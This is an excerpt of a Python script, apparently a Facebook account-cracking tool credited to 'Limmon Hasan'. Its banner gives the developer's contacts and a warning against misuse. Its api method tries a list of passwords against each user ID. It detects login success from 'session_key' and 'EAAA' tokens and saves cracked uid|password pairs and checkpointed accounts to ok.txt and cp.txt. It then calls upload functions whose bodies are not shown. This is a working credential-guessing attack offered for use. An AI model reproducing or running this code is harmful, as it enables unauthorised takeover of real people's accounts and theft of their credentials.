...
class Main:
	def __init__(self):
		...
		print ("""\033[0;92
 \033[0;91   __ _                                 
 \033[0;92  / /(_)_ __ ___  _ __ ___   ___  _ __  
 \033[0;93m      / / | | '_ ` _ \| '_ ` _ \ / _ \| '_ \ 
  \033[0;94m   / /__| | | | | | | | | | | | (_) | | | |
  \033[0;95\____/_|_| |_| |_|_| |_| |_|\___/|_| |_|

 > \033[0;92mDEVELOPER     : Limmon Hasan
 > \033[0;95mFACEBOOK ID   : Limmon Hasan
 > \033[0;41mWHATSAPP      : 01842712797
 \033[0;96m> YOUTUBE       : Limmon Hasan
 > \033[0;97mWARNING       : KNO SALAI KHARAP KAJE USE KORBI NA     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [Limmon] : %s/%s -> \033[0;92m [ KHAN-OK:%s ]- \033[0;93m[KHAN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[Limmon-OK🥀] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [Limmon-OK🥀] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[Limmon-CP🥺] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [Limmon-CP🥺] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
